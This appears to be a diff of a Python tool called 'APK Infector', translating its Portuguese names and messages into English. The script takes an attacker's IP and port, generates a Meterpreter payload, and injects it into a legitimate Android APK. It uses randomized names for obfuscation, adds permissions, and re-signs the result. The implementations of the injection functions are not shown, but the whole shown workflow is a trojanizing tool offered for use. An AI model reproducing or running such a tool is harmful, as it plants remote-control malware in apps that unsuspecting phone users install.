@@ -7,72 +7,72 @@ import random
 import banner
 import shutil
 
-# Cores para melhorar a legibilidade
+# ANSI Color Codes for Improved Readability
 BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'
 
-def obter_argumentos():
+def get_arguments():
     banner.banner1()
     parser = argparse.ArgumentParser(description=f'{RED}APK Infector v1.0')
-    parser._optionals.title = f"{GREEN}Argumentos Opcionais{YELLOW}"
+    parser._optionals.title = f"{GREEN}Optional Arguments{YELLOW}"
 
-    argumentos_obrigatorios = parser.add_argument_group(f'{RED}Argumentos Obrigatórios{GREEN}')
-    argumentos_obrigatorios.add_argument("--lhost", dest="lhost", help="Endereço IP do Atacante", required=True)
-    argumentos_obrigatorios.add_argument("--lport", dest="lport", help="Porta do Atacante", required=True)
-    argumentos_obrigatorios.add_argument("-n", "--normal-apk", dest="normal_apk", help="Caminho Absoluto do Arquivo APK Legítimo", required=True)
-    argumentos_obrigatorios.add_argument("--apk-name", dest="apkName", help="Caminho Absoluto do Arquivo APK Legítimo", required=True)
+    mandatory_arguments = parser.add_argument_group(f'{RED}Mandatory Arguments{GREEN}')
+    mandatory_arguments.add_argument("--lhost", dest="lhost", help="Attacker's IP Address", required=True)
+    mandatory_arguments.add_argument("--lport", dest="lport", help="Attacker's Port", required=True)
+    mandatory_arguments.add_argument("-n", "--normal-apk", dest="normal_apk", help="Absolute Path of Legitimate APK File", required=True)
+    mandatory_arguments.add_argument("--apk-name", dest="apkName", help="Absolute Path of Legitimate APK File", required=True)
 
     return parser.parse_args()
 
-def verificar_dependencias(dependencia, nome):
-    # Verifica se a dependência está instalada
-    status = os.system(f"which {dependencia} > /dev/null")
+def check_dependencies(dependency, name):
+    # Check if the dependency is installed
+    status = os.system(f"which {dependency} > /dev/null")
     if status == 0:
-        print(f"{GREEN}[+] {nome} - OK")
+        print(f"{GREEN}[+] {name} - OK")
     else:
-        # Se não estiver instalada, oferece a opção de instalar
-        print(f"{RED}[!] {nome} - 404 NOT FOUND !")
-        instalar_dependencia = input(f"{BLUE}\n[?] Deseja instalar agora? (s/n) : ")
-        if instalar_dependencia.lower() == "s":
+        # If not installed, offer the option to install
+        print(f"{RED}[!] {name} - 404 NOT FOUND !")
+        install_dependency = input(f"{BLUE}\n[?] Do you want to install now? (y/n) : ")
+        if install_dependency.lower() == "y":
             os.system("apt-get update")
-            os.system(f"apt-get install {dependencia}")
+            os.system(f"apt-get install {dependency}")
 
-def verificar_dependencias_e_atualizacoes():
-    print(f"{YELLOW}\n[*] Verificando Dependências \n{WHITE}================================\n\n[:] OBSERVAÇÃO: {GREEN}Jarsigner{WHITE} ou {GREEN}APKsigner{WHITE} é usado para assinar o APK, um deles deve estar instalado no seu sistema")
+def check_dependencies_and_updates():
+    print(f"{YELLOW}\n[*] Checking Dependencies \n{WHITE}================================\n\n[:] NOTE: {GREEN}Jarsigner{WHITE} or {GREEN}APKsigner{WHITE} is used to sign the APK, one of them must be installed on your system")
     
-    # Verificar dependências específicas
-    verificar_dependencias("apktool", "APKTool")
-    verificar_dependencias("jarsigner", "Jarsigner")
-    verificar_dependencias("apksigner", "APKsigner")
-    verificar_dependencias("zipalign", "ZipAlign")
+    # Check specific dependencies
+    check_dependencies("apktool", "APKTool")
+    check_dependencies("jarsigner", "Jarsigner")
+    check_dependencies("apksigner", "APKsigner")
+    check_dependencies("zipalign", "ZipAlign")
 
-# Restante do código mantido similar, exceto para funções adicionais e melhor organização.
+# The rest of the code kept similar, except for additional functions and better organization.
 
 def main():
-    arguments = obter_argumentos()  
-    print(f"{YELLOW}\n[*] Gerando Variáveis Aleatórias para Obfuscação")
-    VAR1 = gerar_nome_aleatorio()
-    VAR2 = gerar_nome_aleatorio()
-    VAR3 = gerar_nome_aleatorio()
-    VAR4 = gerar_nome_aleatorio()
-    VAR5 = gerar_nome_aleatorio()
-    VAR6 = gerar_nome_aleatorio()
-    VAR7 = gerar_nome_aleatorio()
-    VAR8 = gerar_nome_aleatorio()
+    arguments = get_arguments()  
+    print(f"{YELLOW}\n[*] Generating Random Variables for Obfuscation")
+    VAR1 = generate_random_name()
+    VAR2 = generate_random_name()
+    VAR3 = generate_random_name()
+    VAR4 = generate_random_name()
+    VAR5 = generate_random_name()
+    VAR6 = generate_random_name()
+    VAR7 = generate_random_name()
+    VAR8 = generate_random_name()
     apkName = arguments.apkName
-    print(f"{GREEN}[+] Gerado com Sucesso!")
+    print(f"{GREEN}[+] Generated Successfully!")
 
-    verificar_dependencias_e_atualizacoes()
-    gerar_payload_meterpreter(arguments.lhost, arguments.lport)
-    decompilar_evil_and_normal_apk()
-    modificar_arquivos_apk(VAR1, VAR2, VAR3, VAR4, VAR5, VAR6, VAR7, VAR8, apkName)
-    mover_arquivos_payload_apk_normal(VAR1)
-    conectar_meterpreter_apk(VAR1, VAR2, VAR3)
-    injetar_permissao_meterpreter()
-    remover_duplicatas_AndroidManifest()
-    compilar_apk_infectado()
-    assinar_apk()
+    check_dependencies_and_updates()
+    generate_payload_meterpreter(arguments.lhost, arguments.lport)
+    decompile_evil_and_normal_apk()
+    modify_apk_files(VAR1, VAR2, VAR3, VAR4, VAR5, VAR6, VAR7, VAR8, apkName)
+    move_payload_files_apk_normal(VAR1)
+    connect_meterpreter_apk(VAR1, VAR2, VAR3)
+    inject_permission_meterpreter()
+    remove_duplicates_AndroidManifest()
+    compile_infected_apk()
+    sign_apk()
     zipalign_apk()
-    limpeza()
+    cleanup()
 
 if __name__ == '__main__':
     main()
